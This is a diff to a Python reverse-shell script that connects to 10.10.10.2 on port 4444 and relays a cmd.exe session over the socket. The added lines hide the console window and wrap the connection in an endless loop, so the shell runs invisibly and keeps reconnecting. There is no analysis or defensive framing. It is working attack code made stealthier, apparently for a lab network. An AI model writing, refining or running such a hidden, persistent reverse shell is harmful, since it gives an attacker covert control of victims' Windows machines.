@@ -1,4 +1,9 @@
 import os, socket, subprocess, threading
+import win32console
+import win32gui
+
+ventana = win32console.GetConsoleWindow()
+win32gui.ShowWindow(ventana, 0)
 
 def s2p(s, p):
     while True:
@@ -11,24 +16,25 @@ def p2s(s, p):
     while True:
         s.send(p.stdout.read(1))
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.10.10.2", 4444))
+while True:  # Bucle infinito
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("10.10.10.2", 4444))
 
-if os.name == "nt":  # Check if the operating system is Windows
-    p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+    if os.name == "nt":  # Comprobar si el sistema operativo es Windows
+        p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
-s2p_thread = threading.Thread(target=s2p, args=[s, p])
-s2p_thread.daemon = True
-s2p_thread.start()
+    s2p_thread = threading.Thread(target=s2p, args=[s, p])
+    s2p_thread.daemon = True
+    s2p_thread.start()
 
-p2s_thread = threading.Thread(target=p2s, args=[s, p])
-p2s_thread.daemon = True
-p2s_thread.start()
+    p2s_thread = threading.Thread(target=p2s, args=[s, p])
+    p2s_thread.daemon = True
+    p2s_thread.start()
 
-try:
-    p.wait()
-except KeyboardInterrupt:
-    s.close()
+    try:
+        p.wait()
+    except KeyboardInterrupt:
+        s.close()
 
 
 
